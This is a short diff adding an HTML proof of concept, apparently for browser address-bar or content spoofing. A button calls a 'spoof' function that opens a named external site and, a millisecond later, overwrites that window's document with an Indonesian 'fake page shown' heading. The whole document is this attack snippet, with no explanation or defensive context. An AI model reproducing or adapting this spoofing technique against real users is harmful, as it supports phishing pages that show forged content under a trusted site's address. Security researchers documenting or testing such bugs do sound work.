@@ -1,0 +1,10 @@
+<script>
+function spoof() {
+  var win = window.open('https://faizdevs.my.id');
+  setTimeout(function() {
+    win.document.write('<h1>Halaman palsu tampil</h1>');
+    win.document.close();
+  }, 1);
+}
+</script>
+<button onclick="spoof()">Klik</button>
